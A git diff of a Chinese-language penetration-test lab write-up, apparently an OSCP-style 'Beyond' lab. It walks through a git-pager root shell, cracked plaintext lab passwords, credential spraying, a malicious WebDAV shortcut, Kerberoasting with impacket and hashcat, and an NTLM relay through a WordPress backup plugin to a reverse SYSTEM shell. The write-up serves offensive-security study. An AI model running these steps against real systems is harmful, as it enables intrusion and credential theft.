@@ -322,7 +322,7 @@ index 25667c7..0000000
 ```bash
 daniela@websrv1:/srv/www/wordpress$ sudo git branch --help config
 ```
-當終端機呈現 `less` 分頁器狀態時，輸入：
+當終端機呈現 `less` 分頁器狀態時，輸入（類似 `vim` 的 `:wq` 操作方式）：
 ```text
 !/bin/bash
 ```
@@ -346,6 +346,18 @@ root
 daniela:tequieromucho
 wordpress:DanielKeyboard3311
 john:dqsTwTpZPn#nL
+
+┌──(kali㉿kali)-[~/Desktop/Beyond] 
+└─$ cat users.txt 
+daniela 
+wordpress 
+john 
+
+┌──(kali㉿kali)-[~/Desktop/Beyond] 
+└─$ cat passwords.txt 
+tequieromucho 
+DanielKeyboard3311 
+dqsTwTpZPn#nL
 ```
 
 使用 `nxc smb` 工具對外網的 `Mailserver (192.168.224.242)` 進行憑證噴灑（Credential Spraying）：
@@ -381,7 +393,11 @@ SMB         192.168.224.242 445    MAILSRV1         IPC$            READ        
 
    ┌──(kali㉿kali)-[~/Desktop/Beyond/webdav]
    └─$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/Desktop/Beyond/webdav
-   Serving on http://0.0.0.0:80 ...
+   Running without configuration file.
+
+   ...........
+
+   01:33:38.850 - INFO    : Serving on http://0.0.0.0:80 ...
    ```
 2. **在 WebDAV 目錄中準備惡意快捷方式 `runme.lnk`**：
    該快捷方式執行的指令為：
@@ -474,14 +490,14 @@ PS C:\users\Public> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\
 
 在 BloodHound 中載入該資料庫進行分析，發現重要成果：
 1. **主機與使用者數量**：網域中共存在 4 台主機與 8 個使用者。
-   ![image](https://hackmd.io/_uploads/B1cZXmT-Me.png)
-   ![image](https://hackmd.io/_uploads/HyV4XQT-fg.png)
+   ![image](image/B1cZXmT-Me.png)
+   ![image](image/HyV4XQT-fg.png)
 2. **Domain Admin**：使用者 `beccy` 屬於 **Domain Admins** 群組。
-   ![image](https://hackmd.io/_uploads/Hyz6mXTZGl.png)
+   ![image](image/Hyz6mXTZGl.png)
 3. **Session 資訊**：`beccy` 在 `MAILSRV1` 上有一個活躍的登入 Session。
-   ![image](https://hackmd.io/_uploads/rJVWSQ6WGg.png)
+   ![image](image/rJVWSQ6WGg.png)
 4. **Kerberoasting 可能性**：使用者 `daniela` 設定了 SPN，為可受 Kerberoasting 攻擊的帳號。
-   ![image](https://hackmd.io/_uploads/rk6fI76-Gg.png)
+   ![image](image/rk6fI76-Gg.png)
 
 ### 🌉 內網代理架設 (Ligolo-NG)
 為了存取內網 `172.16.180.0/24` 的服務，在 CLIENTWK1 上架設 Ligolo 代理：
@@ -559,6 +575,18 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
 ----------------------------  -------  --------  --------------------------  --------------------------  ----------
 http/internalsrv1.beyond.com  daniela            2022-09-29 04:17:20.062328  2022-10-05 03:59:48.376728             
+
+┌──(kali㉿kali)-[~/Desktop/Beyond]
+└─$ impacket-GetUserSPNs -dc-ip 172.16.180.240 -request -outputfile daniela.kerberoast beyond.com/john:dqsTwTpZPn#nL
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
+----------------------------  -------  --------  --------------------------  --------------------------  ----------
+http/internalsrv1.beyond.com  daniela            2022-09-29 04:17:20.062328  2022-10-05 03:59:48.376728             
+
+
+
+[-] CCache file is not found. Skipping...
 ```
 
 取得 TGS 票據後，利用 `hashcat` 進行破解：
@@ -572,10 +600,10 @@ $krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*........:DANIelaRO123
 成功解出 `daniela` 帳密：**`daniela:DANIelaRO123`**。
 
 使用該憑證成功登入 `http://internalsrv1.beyond.com/wp-admin` 後台：
-![image](https://hackmd.io/_uploads/Hkf8zETZGl.png)
+![image](image/Hkf8zETZGl.png)
 
 在後台的插件管理介面中，發現啟用了外掛：**`Backup Migration`**。
-![image](https://hackmd.io/_uploads/rJMxBVTWfl.png)
+![image](image/rJMxBVTWfl.png)
 
 ---
 
@@ -605,11 +633,11 @@ SMB         172.16.180.254  445    MAILSRV1         [*] Windows Server 2022 Buil
 [*] Servers started, waiting for connections
 ```
 
-進入 `Backup Migration` 管理介面，其備份目錄通常為本機路徑。我們將其修改為 Kali 的 SMB 路徑（`\\192.168.45.243\backup`）：
-![image](https://hackmd.io/_uploads/Bk_GBNp-Gg.png)
-![image](https://hackmd.io/_uploads/HJOj9NpZfe.png)
+進入 `Backup Migration` 管理介面，其備份目錄通常為本機路徑。我們將其修改為 Kali 的 SMB 路徑（`//192.168.45.243/xxxx`）：
+![image](image/Bk_GBNp-Gg.png)
+![image](image/HJOj9NpZfe.png)
 
-點擊保存或觸發備份，因為 WordPress 以高權限執行，該 Windows 伺服器會向攻擊機 Kali 的 SMB 服務進行驗證。
+點擊保存或觸發備份，該 Windows 伺服器會以 WordPress 的執行權限（假設為高權限）向攻擊機 Kali 的 SMB 服務進行驗證。
 Kali 收到驗證後，立即將其 Relay 至 `MAILSRV1` 並執行反彈指令。
 
 ### 成功取得 MAILSRV1 SYSTEM 權限 Shell
